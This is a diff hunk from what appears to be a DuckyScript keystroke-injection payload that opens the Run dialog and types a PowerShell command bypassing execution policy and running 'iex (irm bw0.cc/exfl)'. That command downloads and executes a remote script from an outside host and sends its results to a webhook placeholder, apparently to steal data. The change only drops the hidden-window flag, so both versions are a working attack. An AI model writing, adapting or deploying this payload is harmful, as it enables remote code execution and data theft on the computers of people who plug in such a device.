@@ -15,6 +15,6 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; iex (irm bw0.cc/exfl)
+STRING powershell -Ep Bypass -C $dc='WEBHOOK_HERE'; iex (irm bw0.cc/exfl)
 ENTER
 
